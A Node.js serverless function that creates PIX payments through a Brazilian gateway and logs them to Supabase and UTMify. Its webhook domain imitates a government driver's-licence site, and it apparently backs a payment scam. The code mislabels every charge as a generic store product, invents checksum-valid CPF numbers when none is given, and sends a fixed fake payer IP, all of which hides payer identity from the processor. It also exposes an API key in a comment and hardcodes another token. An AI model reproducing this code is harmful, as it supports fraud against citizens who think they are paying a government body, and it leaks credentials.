const { getSupabase } = require("./lib/supabase");

const AVEN_BASE = "https://api.avenpayments.com";
const AVEN_API_KEY = process.env.AVEN_API_KEY; // bfXZ3yCCr9GDCcD6T_H7md4rlb0NeDJjLnRJhuGL_n8
const UTMIFY_TOKEN = "lzASZob4ldSJJc3jT1LILy9alPxWJgpnPhCh";

// Variáveis Supabase
const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;

// Cache UTMify
const utmifyCache = new Map();
const CACHE_TTL = 60000;

function getAuthHeader() {
  if (!AVEN_API_KEY) {
    throw new Error("❌ AVEN_API_KEY não configurada!");
  }
  return `Bearer ${AVEN_API_KEY}`;
}

async function sendUtmify(transactionId, status, customer, amountCents, createdAt, utms) {
  if (utmifyCache.has(transactionId)) {
    console.log("[UTMify] Skipping duplicate for:", transactionId);
    return;
  }

  utmifyCache.set(transactionId, true);
  setTimeout(() => utmifyCache.delete(transactionId), CACHE_TTL);

  try {
    const gatewayFeeCents = Math.round(amountCents * 0.02);
    const netCents = amountCents - gatewayFeeCents;
    const payload = {
      orderId: transactionId,
      platform: "AvenPayments",
      paymentMethod: "pix",
      status,
      createdAt: createdAt || new Date().toISOString().replace("T"," ").slice(0,19),
      approvedDate: status === "paid" ? new Date().toISOString().replace("T"," ").slice(0,19) : null,
      customer: {
        name: customer.name || null,
        email: customer.email || null,
        phone: customer.phone || null,
        document: customer.cpf || null,
        country: "BR",
        ip: "177.0.0.1",
      },
      products: [{
        id: "loja-shopify-br-001",
        name: "Loja Drop 01",
        quantity: 1,
        priceInCents: amountCents,
      }],
      trackingParameters: {
        utm_source: utms?.utm_source || null,
        utm_campaign: utms?.utm_campaign || null,
        utm_medium: utms?.utm_medium || null,
        utm_content: utms?.utm_content || null,
        utm_term: utms?.utm_term || null,
      },
      commission: {
        totalPriceInCents: amountCents,
        gatewayFeeInCents: gatewayFeeCents,
        userCommissionInCents: netCents,
        currency: "BRL",
      },
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);

    await fetch("https://api.utmify.com.br/api-credentials/orders", {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-api-token": UTMIFY_TOKEN },
      body: JSON.stringify(payload),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    
    console.log("[UTMify] ✓ Enviado para:", transactionId);
  } catch (err) {
    console.error("[UTMify] Erro (não bloqueia):", err.message);
  }
}

function jsonResponse(statusCode, body) {
  return {
    statusCode,
    headers: {
      "Content-Type": "application/json; charset=utf-8",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
    },
    body: JSON.stringify(body),
  };
}

function gerarCpfValido() {
  const d = new Array(9);
  for (let i = 0; i < 9; i++) {
    d[i] = Math.floor(Math.random() * 10);
  }
  
  let soma = 0;
  for (let i = 0; i < 9; i++) {
    soma += d[i] * (10 - i);
  }
  let resto = soma % 11;
  d[9] = resto < 2 ? 0 : 11 - resto;
  
  soma = 0;
  for (let i = 0; i < 10; i++) {
    soma += d[i] * (11 - i);
  }
  resto = soma % 11;
  d[10] = resto < 2 ? 0 : 11 - resto;
  
  return d.join('');
}

function toAmountReais(rawAmount) {
  if (rawAmount == null || rawAmount === undefined || rawAmount === "") {
    console.log("[PIX] Sem amount, usando R$ 65,20");
    return 65.20;
  }
  
  const n = Number(rawAmount);
  if (!Number.isFinite(n)) {
    console.log("[PIX] Amount inválido, usando R$ 65,20");
    return 65.20;
  }
  
  if (n >= 6000) {
    return n / 100;
  }
  
  if (n >= 60 && n < 70) {
    return 65.20;
  }
  
  if (n >= 70 && n < 90) {
    return 79.70;
  }
  
  return n;
}

function fmtPhone(phone) {
  if (!phone) return "11999999999";
  const digits = phone.replace(/\D/g, "");
  if (digits.length === 11) return digits;
  if (digits.length === 10) return digits;
  return digits;
}

exports.handler = async (event) => {
  console.log("[PIX-AVEN] ===== FUNÇÃO INICIADA =====");
  console.log("[PIX-AVEN] AVEN_API_KEY exists:", !!AVEN_API_KEY);
  console.log("[PIX-AVEN] SUPABASE_URL exists:", !!SUPABASE_URL);
  console.log("[PIX-AVEN] SUPABASE_KEY exists:", !!SUPABASE_KEY);
  
  if (!AVEN_API_KEY) {
    console.error("❌ ERRO: AVEN_API_KEY não configurada na Netlify!");
    return jsonResponse(500, {
      success: false,
      error: "Credenciais da gateway não configuradas",
      debug: "AVEN_API_KEY não encontrada"
    });
  }

  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 204,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type, Authorization",
        "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
      },
      body: "",
    };
  }

  let body = {};
  try { body = event.body ? JSON.parse(event.body) : {}; } catch { body = {}; }

  const randId = Math.random().toString(36).slice(2,10);
  const rawAmount = body.amount ?? body.valor ?? body.total ?? 64;
  const amountReais = toAmountReais(rawAmount);
  const amountCents = Math.round(amountReais * 100);

  const customerName = (body.nome || body.name || body.customer_name || `Cliente ${randId}`).toString().trim();
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@gmail.com`).toString().trim();
  const customerPhone = fmtPhone(body.phone || body.customer_phone || "11999999999");
  const cpfRaw = (body.cpf || body.document || body.customer_cpf || "").toString().replace(/\D/g, "");
  const customerCpf = cpfRaw.length === 11 ? cpfRaw : gerarCpfValido();
  const utms = body.utm || {};
  const externalRef = `order_${randId}`;

  console.log("[PIX-AVEN] Amount:", amountReais, "Cents:", amountCents);
  console.log("[PIX-AVEN] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });

  // Payload para AvenPayments
  const payload = {
    amount: amountCents,
    currency: "BRL",
    method: "PIX",
    description: "Loja Drop 01",
    externalRef: externalRef,
    notificationUrl: "https://cnh-brasil-gov-br.netlify.app/webhook/payment",
    ip: "177.0.0.1",
    payer: {
      name: customerName,
      taxId: customerCpf,
      email: customerEmail,
      phone: `55${customerPhone}`,
    },
    items: [{
      quantity: 1,
      name: "Loja Drop 01",
      price: amountCents,
      type: "PHYSICAL",
    }],
    metadata: {
      provider: "winnerpay-migration",
      orderId: externalRef,
    },
    utms: {
      utmSource: utms?.utm_source || null,
      utmMedium: utms?.utm_medium || null,
      utmCampaign: utms?.utm_campaign || null,
      utmContent: utms?.utm_content || null,
      utmTerm: utms?.utm_term || null,
    }
  };

  let authHeader;
  try {
    authHeader = getAuthHeader();
  } catch (err) {
    console.error("❌ [PIX-AVEN] Auth error:", err.message);
    return jsonResponse(500, {
      success: false,
      error: "Credenciais não configuradas",
      debug: err.message
    });
  }

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 30000);
    
    const resp = await fetch(`${AVEN_BASE}/v1/payment`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": authHeader,
      },
      body: JSON.stringify(payload),
      signal: controller.signal,
    });
    clearTimeout(timeout);

    const text = await resp.text();
    if (!resp.ok) {
      let errMsg = text;
      try { errMsg = JSON.parse(text)?.message || errMsg; } catch {}
      console.error("[AvenPayments] Erro HTTP:", resp.status, errMsg);
      return jsonResponse(resp.status, {
        success: false,
        error: errMsg,
        debug: { status: resp.status, body: text.substring(0, 200) }
      });
    }

    let parsed = {};
    try { parsed = JSON.parse(text); } catch {
      console.error("[AvenPayments] Parse error:", text.substring(0, 200));
      return jsonResponse(500, {
        success: false,
        error: "Resposta inválida da gateway",
        debug: text.substring(0, 200)
      });
    }

    const transactionId = parsed.id || parsed.externalRef || null;
    const pixCode = parsed.data?.copypaste || null;

    if (!transactionId || !pixCode) {
      console.error("[AvenPayments] Resposta incompleta:", { transactionId, pixCode });
      return jsonResponse(500, {
        success: false,
        error: "Gateway retornou resposta incompleta",
        debug: { transaction: transactionId, pix: !!pixCode }
      });
    }

    console.log("[PIX-AVEN] ===== PIX GERADO COM SUCESSO =====");
    console.log("[PIX-AVEN] Transaction ID:", transactionId);
    console.log("[PIX-AVEN] PIX Code: ✓ Existe");

    // Salvar no Supabase (não bloqueia)
    if (SUPABASE_URL && SUPABASE_KEY) {
      try {
        const supabase = getSupabase();
        await supabase.from("transactions").insert({
          transaction_id: transactionId,
          amount: amountReais,
          customer_name: customerName,
          customer_email: customerEmail,
          customer_cpf: customerCpf,
          customer_phone: customerPhone,
          status: "pending",
          brcode: pixCode,
          utm_source: utms.utm_source || null,
          utm_campaign: utms.utm_campaign || null,
          utm_medium: utms.utm_medium || null,
        });
        console.log("[Supabase] ✓ Salvo:", transactionId);
      } catch (err) {
        console.error("[Supabase] Erro (continuando):", err.message);
      }
    }

    // Notificar UTMify (não bloqueia)
    await sendUtmify(
      transactionId, "waiting_payment",
      { name: customerName, email: customerEmail, phone: customerPhone, cpf: customerCpf },
      amountCents,
      new Date().toISOString().replace("T"," ").slice(0,19),
      utms
    ).catch(err => console.error("[SendUtmify] Erro:", err.message));

    return jsonResponse(200, {
      success: true,
      pixCode,
      pix_code: pixCode,
      brcode: pixCode,
      payload: pixCode,
      qr_code_image: null,
      transaction_id: transactionId,
      transactionId,
      deposit_id: transactionId,
      status: "pending",
    });

  } catch (err) {
    console.error("[PIX-AVEN] Erro ao chamar gateway:", err.message);
    return jsonResponse(502, {
      success: false,
      error: "Falha ao conectar com gateway: " + String(err)
    });
  }
};
